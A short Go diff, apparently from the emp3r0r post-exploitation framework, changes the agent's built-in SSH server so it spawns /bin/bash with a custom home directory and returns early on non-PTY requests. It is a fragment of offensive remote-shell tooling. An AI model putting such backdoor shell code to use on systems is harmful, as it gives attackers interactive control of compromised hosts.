@@ -46,7 +46,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			if err != nil {
 				log.Printf("sshd: extract built-in bash: %v", err)
 			}
-			cmd = exec.Command(util.FileBaseName(emp3r0r_data.DefaultShell))
+			cmd = exec.Command("/bin/bash")
 			bash_home := RuntimeConfig.UtilsPath // change home to use our bashrc
 			os.Setenv("HOME", bash_home)
 			os.Setenv("SHELL", cmd.Path)
@@ -60,6 +60,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
 		} else {
 			log.Print("Got an SSH request")
+			return
 		}
 		f, err := pty.Start(cmd)
 		if err != nil {
@@ -95,7 +96,6 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			err = fmt.Errorf("PTY process %d died prematurely\n", cmd.Process.Pid)
 			log.Print(err)
 			io.WriteString(s, err.Error())
-
 		}
 		_, err = io.Copy(s, f) // stdout
 		if err != nil {
